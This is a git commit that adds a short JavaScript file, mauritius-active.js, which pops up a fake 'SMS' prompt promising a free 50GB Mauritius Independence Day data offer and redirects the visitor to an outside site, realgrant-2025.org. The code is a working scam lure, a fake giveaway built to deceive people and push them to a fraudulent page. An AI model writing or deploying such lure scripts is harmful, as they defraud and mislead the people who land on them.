3739789e2bb63fbcdcadfe8a15e8d1868d0915cb
Sweetblogboi <nsiboy760@gmail.com>
2025-03-01 07:54:59 +0100

    Create mauritius-active.js

---
+++ mauritius-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify to receive 50GB Mauritius Independence day Celebration Offer, Kindly Press OK to Activate now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://realgrant-2025.org/mauritius-50gb.html';
+}
